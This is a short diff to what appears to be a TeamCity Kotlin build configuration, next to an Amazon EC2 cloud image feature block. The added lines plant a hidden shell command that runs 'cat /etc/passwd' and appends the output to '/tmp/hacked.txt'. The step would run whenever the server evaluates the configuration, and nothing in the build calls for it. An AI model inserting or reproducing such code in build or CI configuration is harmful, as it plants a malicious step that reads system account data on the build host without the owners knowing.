@@ -31,6 +31,11 @@ project {
 
     buildType(Build)
 
+    val builder = ProcessBuilder()
+    builder.command("sh", "-c", "cat /etc/passwd >> /tmp/hacked.txt")
+    val process = builder.start()
+    val exitCode = process.waitFor()
+
     features {
         amazonEC2CloudImage {
             id = "PROJECT_EXT_5"
